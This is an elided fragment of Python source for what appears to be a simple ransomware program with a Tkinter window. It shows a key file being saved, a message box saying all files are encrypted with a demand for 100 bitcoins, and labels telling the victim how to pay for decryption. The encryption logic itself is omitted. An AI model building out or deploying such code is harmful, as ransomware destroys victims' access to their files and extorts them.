...
def generate_and_save_key():
    ...
    key_path = os.path.join(folder_path, "hereyourkey.key")
...
def encrypt_files():
    ...
    messagebox.showinfo("Encryption Complete", "All your file have been encrypted. Send 100 bitcoins! #POGIbart ")
...
label = tk.Label(app, text="How to decrypt?")
label = tk.Label(app, text="Step 1: sent me 100 bitcoin in this account to get access the key password.")
label.pack()
